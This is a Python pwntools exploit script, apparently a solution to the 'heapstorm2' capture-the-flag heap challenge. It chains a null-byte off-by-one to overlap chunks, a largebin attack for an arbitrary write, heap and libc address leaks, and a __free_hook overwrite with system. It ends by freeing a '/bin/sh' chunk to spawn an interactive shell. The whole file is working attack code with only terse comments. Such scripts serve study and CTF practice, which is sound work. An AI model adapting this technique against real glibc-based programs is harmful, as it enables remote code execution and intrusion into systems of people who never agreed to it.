from pwn import *

io = remote('0.0.0.0', 10001)		# io = process("./heapstorm2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

def add(size):
	io.sendlineafter(":", str(1))
	io.sendlineafter(":", str(size))

def update(index, content):
	io.sendlineafter(":", str(2))
	io.sendlineafter(":", str(index))
	io.sendlineafter(':', str(len(content)))
	io.sendafter(":", str(content))

def dele(index):
	io.sendlineafter(":", str(3))
	io.sendlineafter(":", str(index))

def view(index):
	io.sendlineafter(":", str(4))
	io.sendlineafter(":", str(index))
	io.recvuntil("[1]: ")
	return u64(io.recv(8))

def overlap():
	add(0x18)		# 0
	add(0x508)		# 1
	add(0x18)		# 2
	update(1, 'A'*0x4f0 + p64(0x500))		# fake prev_size
	add(0x18)		# 3
	add(0x508)		# 4
	add(0x18)		# 5
	update(4, 'A'*0x4f0 + p64(0x500))		# fake prev_size
	add(0x18)		# 6

	dele(1)
	update(0, 'A'*(0x18-12))				# null byte off-by-one, 0x511->0x500
	add(0x18)		# 1
	add(0x4d8)		# 7					# 0x20+0x4e0 = 0x500
	dele(1)
	dele(2)								# unlink, overlap
	add(0x38)		# 1
	add(0x4e8)		# 2					# 0x40+0x4f0 = 0x530

	dele(4)
	update(3, 'A'*(0x18-12))				# null byte off-by-one, 0x511->0x500
	add(0x18)		# 4
	add(0x4d8)		# 8					# 0x20+0x4e0 = 0x500
	dele(4)
	dele(5)								# unlink, overlap
	add(0x48)		# 4

	dele(2)
	add(0x4e8)		# 2					# clear unsorted bin
	dele(2)								# unsorted bin

def largebin_attach():
	p1  = p64(0)*2 + p64(0) + p64(0x4f1)	# size
	p1 += p64(0) + p64(fake_chunk)		# bk
	update(7, p1)

	p2  = p64(0)*4 + p64(0) + p64(0x4e1)	# size
	p2 += p64(0) + p64(fake_chunk + 8)	# bk
	p2 += p64(0) + p64(fake_chunk - 0x18 - 5)	# bk_nextsize
	update(8, p2)

	add(0x48)		# 2					# heap address "0x56xxxxxxxxxx"

def pwn():
	a = p64(0)*4 + p64(0) + p64(0x13377331) + p64(encode_addr)
	update(2, a)

	a = header + p64(encode_addr - 0x20 + 3) + p64(8)
	update(0, a)
	heap_addr = view(1)					# leak heap

	a = header + p64(heap_addr + 0x10) + p64(8)
	update(0, a)
	unsorted_bin = view(1)				# leak libc
	libc_base = unsorted_bin - libc.sym['__malloc_hook'] - 88 - 0x10

	a  = header
	a += p64(libc_base + libc.sym['__free_hook']) + p64(0x100)
	a += p64(encode_addr + 0x50) + p64(0x100) + '/bin/sh\0'
	update(0, a)
	update(1, p64(libc_base + libc.sym['system']))

	io.sendlineafter(":", '3')
	io.sendlineafter(":", str(2))
	io.interactive()

encode_addr = 0x13370000 + 0x800
fake_chunk = encode_addr - 0x20
header  = p64(0)*2 + p64(0) + p64(0x13377331)	# a1[3] ^ a1[2] == 0x13377331LL
header += p64(encode_addr) + p64(0x100)			# heap_info

overlap()
largebin_attach()
pwn()
